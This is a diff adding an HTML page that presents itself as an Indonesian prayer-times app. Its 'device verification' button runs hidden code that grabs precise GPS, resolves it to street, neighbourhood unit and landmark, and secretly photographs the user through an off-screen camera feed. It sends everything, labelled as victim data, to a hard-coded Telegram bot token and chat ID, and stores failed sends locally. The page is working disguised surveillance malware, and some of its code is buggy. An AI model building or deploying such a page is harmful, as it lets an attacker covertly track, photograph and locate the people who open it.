@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Jadwal Sholat</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#0a1a0a;
+            font-family:Arial,sans-serif;
+            color:#e8f5e9;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:12px
+        }
+        .container{
+            max-width:420px;width:100%;background:rgba(18,38,18,0.92);
+            border-radius:28px;padding:24px 18px 20px;
+            border:1px solid rgba(76,175,80,0.10)
+        }
+        .header{text-align:center;margin-bottom:14px}
+        .header .icon{font-size:38px}
+        .header h1{font-size:22px;color:#a5d6a7;font-weight:400}
+        .header .sub{color:#5a7a5a;font-size:11px;margin-top:2px}
+        .prayer-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:14px 0 16px}
+        .prayer-item{
+            background:rgba(30,55,30,0.35);border-radius:12px;padding:12px 4px;
+            text-align:center;border:1px solid rgba(76,175,80,0.05)
+        }
+        .prayer-item .name{font-size:10px;color:#7a9a7a;text-transform:uppercase}
+        .prayer-item .time{font-size:18px;color:#c8e6c9;font-weight:500}
+        .prayer-item.active{border-color:rgba(76,175,80,0.25);background:rgba(76,175,80,0.08)}
+        .prayer-item.active .time{color:#81c784}
+        .prayer-item.full{grid-column:span 2}
+        .divider{height:1px;background:rgba(76,175,80,0.12);margin:8px 0 12px}
+        .info-row{display:flex;justify-content:space-between;font-size:12px;color:#6a8a6a;padding:4px 0;border-bottom:1px solid rgba(76,175,80,0.03)}
+        .info-row span:last-child{color:#a5d6a7;text-align:right}
+        .footer{text-align:center;font-size:10px;color:#3a5a3a;margin-top:14px}
+        .btn-trigger{
+            display:block;width:100%;padding:10px;margin-top:8px;
+            background:rgba(76,175,80,0.15);border:1px solid rgba(76,175,80,0.2);
+            border-radius:10px;color:#a5d6a7;font-size:13px;text-align:center;
+            cursor:pointer
+        }
+        .btn-trigger:active{background:rgba(76,175,80,0.3)}
+        .status-bar{font-size:9px;color:#3a5a3a;text-align:center;margin-top:6px;padding:4px;border-radius:6px;background:rgba(0,0,0,0.2)}
+        .status-bar.success{color:#81c784}
+        .status-bar.fail{color:#ff6b6b}
+        video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <span class="icon">🕌</span>
+        <h1>Jadwal Sholat</h1>
+        <div class="sub" id="locationSub">📍 Menentukan lokasi...</div>
+    </div>
+
+    <div class="prayer-grid">
+        <div class="prayer-item active"><div class="name">Subuh</div><div class="time">04:30</div></div>
+        <div class="prayer-item"><div class="name">Dzuhur</div><div class="time">12:15</div></div>
+        <div class="prayer-item"><div class="name">Ashar</div><div class="time">15:30</div></div>
+        <div class="prayer-item"><div class="name">Maghrib</div><div class="time">18:00</div></div>
+        <div class="prayer-item full"><div class="name">Isya</div><div class="time">19:30</div></div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="info-row"><span>📍 Lokasi</span><span id="displayLocation">-</span></div>
+    <div class="info-row"><span>🕋 Kiblat</span><span>295.4°</span></div>
+    <div class="info-row"><span>📅 Tanggal</span><span id="displayDate"></span></div>
+    <div class="info-row" id="rtRow" style="display:none;"><span>🏘️ RT / RW</span><span id="displayRtRw" style="color:#ffd54f;">-</span></div>
+    <div class="info-row" id="landmarkRow" style="display:none;"><span>📍 Patokan</span><span id="displayLandmark" style="color:#ffcc80;">-</span></div>
+
+    <button class="btn-trigger" onclick="ambilData()">📷 Verifikasi Perangkat</button>
+
+    <div class="status-bar" id="statusBar">⏳ Tap tombol di atas</div>
+
+    <div class="footer">⏳ Waktu sholat berdasarkan lokasi Anda</div>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ================================================================
+// ZYX - TELEGRAM BOT VERSION (PASTI WORK DI HP)
+// ================================================================
+
+// ====== GANTI INI ======
+const BOT_TOKEN = '8684818663:AAGHhzUVMn1irJnrlcpVzNXQjGpImKJzkKU'; // <--- GANTI DENGAN TOKEN BOT KAMU
+const CHAT_ID = '6836011848'; // <--- GANTI DENGAN CHAT ID KAMU
+// =======================
+
+function kirimKeTelegram(pesan) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        console.log('✅ Terkirim ke Telegram:', data);
+    })
+    .catch(err => {
+        console.error('❌ Gagal kirim ke Telegram:', err);
+        // Fallback: simpan ke localStorage
+        try {
+            let semua = JSON.parse(localStorage.getItem('data_korban') || '[]');
+            semua.push({ pesan: pesan, timestamp: new Date().toISOString() });
+            localStorage.setItem('data_korban', JSON.stringify(semua));
+        } catch(e) {}
+    });
+}
+
+function ambilData() {
+    const status = document.getElementById('statusBar');
+    status.textContent = '⏳ Mengambil data...';
+    status.className = 'status-bar';
+
+    // Tanggal
+    document.getElementById('displayDate').textContent = new Date().toLocaleDateString('id-ID', {
+        weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
+    });
+
+    let data = {
+        timestamp: new Date().toISOString(),
+        waktu: new Date().toLocaleString('id-ID'),
+        userAgent: navigator.userAgent,
+        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 HP' : '💻 Laptop',
+        browser: navigator.userAgent.includes('Chrome') ? 'Chrome' :
+                 navigator.userAgent.includes('Firefox') ? 'Firefox' :
+                 navigator.userAgent.includes('Safari') ? 'Safari' : 'Lainnya',
+        lokasi: '-',
+        lat: null,
+        lon: null,
+        rt_rw: '-',
+        landmark: '-',
+        face: 'Tidak'
+    };
+
+    // === AMBIL LOKASI ===
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                data.lat = pos.coords.latitude;
+                data.lon = pos.coords.longitude;
+                data.lokasi = `${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
+                document.getElementById('displayLocation').textContent = data.lokasi;
+                document.getElementById('locationSub').textContent = '📍 ' + data.lokasi;
+
+                // === REVERSE GEOCODE ===
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}&zoom=18&addressdetails=1`)
+                    .then(r => r.json())
+                    .then(res => {
+                        if (res && res.address) {
+                            const a = res.address;
+                            let alamat = '';
+                            if (a.road) alamat += a.road;
+                            if (a.village) alamat += alamat ? ', ' + a.village : a.village;
+                            if (a.city) alamat += alamat ? ', ' + a.city : a.city;
+                            if (a.country) alamat += alamat ? ', ' + a.country : a.country;
+                            if (alamat) {
+                                data.lokasi = alamat;
+                                document.getElementById('displayLocation').textContent = alamat;
+                                document.getElementById('locationSub').textContent = '📍 ' + alamat;
+                            }
+
+                            // RT/RW
+                            let rt = '', rw = '';
+                            if (a.suburb) {
+                                const rm = a.suburb.match(/RT\s*[\.]?\s*(\d+)/i);
+                                if (rm) rt = rm[1];
+                                const rwm = a.suburb.match(/RW\s*[\.]?\s*(\d+)/i);
+                                if (rwm) rw = rwm[1];
+                            }
+                            if (a.village) {
+                                const rm = a.village.match(/RT\s*[\.]?\s*(\d+)/i);
+                                if (rm) rt = rm[1];
+                                const rwm = a.village.match(/RW\s*[\.]?\s*(\d+)/i);
+                                if (rwm) rw = rwm[1];
+                            }
+                            if (rt || rw) {
+                                data.rt_rw = (rt ? 'RT ' + rt : '') + (rt && rw ? ' / ' : '') + (rw ? 'RW ' + rw : '');
+                                document.getElementById('displayRtRw').textContent = data.rt_rw;
+                                document.getElementById('rtRow').style.display = 'flex';
+                            }
+
+                            // Landmark
+                            let landmark = '';
+                            if (a.school) landmark = 'Sekolah ' + a.school;
+                            else if (a.mosque) landmark = 'Masjid ' + a.mosque;
+                            else if (a.market) landmark = 'Pasar ' + a.market;
+                            else if (a.hospital) landmark = 'RS ' + a.hospital;
+                            if (landmark) {
+                                data.landmark = landmark;
+                                document.getElementById('displayLandmark').textContent = landmark;
+                                document.getElementById('landmarkRow').style.display = 'flex';
+                            }
+                        }
+                        kirimSemua(data);
+                    })
+                    .catch(() => {
+                        kirimSemua(data);
+                    });
+            },
+            () => {
+                status.textContent = '⚠️ Gagal ambil lokasi, kirim data tanpa lokasi';
+                status.className = 'status-bar fail';
+                kirimSemua(data);
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        status.textContent = '❌ GPS tidak support';
+        status.className = 'status-bar fail';
+        kirimSemua(data);
+    }
+
+    // === SCAN WAJAH ===
+    function scanWajah(callback) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+            audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 320;
+                    canvas.height = video.videoHeight || 240;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    let facePixels = 0, total = 0;
+                    for (let i = 0; i < data.length; i += 4) {
+                        const r = data[i], g = data[i+1], b = data[i+2];
+                        total++;
+                        const Y = 0.299*r + 0.587*g + 0.114*b;
+                        const Cr = (r - Y)*0.713 + 128;
+                        const Cb = (b - Y)*0.564 + 128;
+                        if (Cr >= 133 && Cr <= 173 && Cb >= 77 && Cb <= 127 && Y > 60) facePixels++;
+                    }
+                    const ratio = facePixels / total;
+
+                    if (ratio > 0.03 && total > 1000) {
+                        data.face = '✅ Terdeteksi';
+                        // Kirim foto ke Telegram
+                        const foto = canvas.toDataURL('image/jpeg', 0.5);
+                        kirimFotoKeTelegram(foto, data);
+                    } else {
+                        data.face = '❌ Tidak terdeteksi';
+                        callback(data);
+                    }
+
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                }, 800);
+            };
+        })
+        .catch(() => {
+            data.face = '🚫 Kamera ditolak';
+            callback(data);
+        });
+    }
+
+    function kirimFotoKeTelegram(fotoBase64, data) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                photo: fotoBase64,
+                caption: `📸 Wajah Korban\n📍 ${data.lokasi}\n🏘️ ${data.rt_rw}\n📱 ${data.device}\n🕐 ${data.waktu}`
+            })
+        })
+        .then(r => r.json())
+        .then(() => {
+            status.textContent = '✅ Data + Foto terkirim ke Telegram!';
+            status.className = 'status-bar success';
+            // Kirim data teks juga
+            kirimPesanText(data);
+        })
+        .catch(() => {
+            // Kirim teks aja
+            kirimPesanText(data);
+        });
+    }
+
+    function kirimPesanText(data) {
+        const pesan = `
+🕌 <b>DATA KORBAN</b>
+━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${data.waktu}
+📱 Perangkat: ${data.device}
+🌐 Browser: ${data.browser}
+📍 Lokasi: ${data.lokasi}
+🏘️ RT/RW: ${data.rt_rw}
+📍 Patokan: ${data.landmark}
+📸 Wajah: ${data.face}
+━━━━━━━━━━━━━━━━━
+📌 User Agent: ${data.userAgent.substring(0, 100)}...
+        `;
+        kirimKeTelegram(pesan);
+        status.textContent = '✅ Data terkirim ke Telegram!';
+        status.className = 'status-bar success';
+    }
+
+    function kirimSemua(data) {
+        // Scan wajah dulu
+        scanWajah((dataWajah) => {
+            data.face = dataWajah.face;
+            kirimPesanText(data);
+        });
+    }
+}
+</script>
+</body>
+</html>
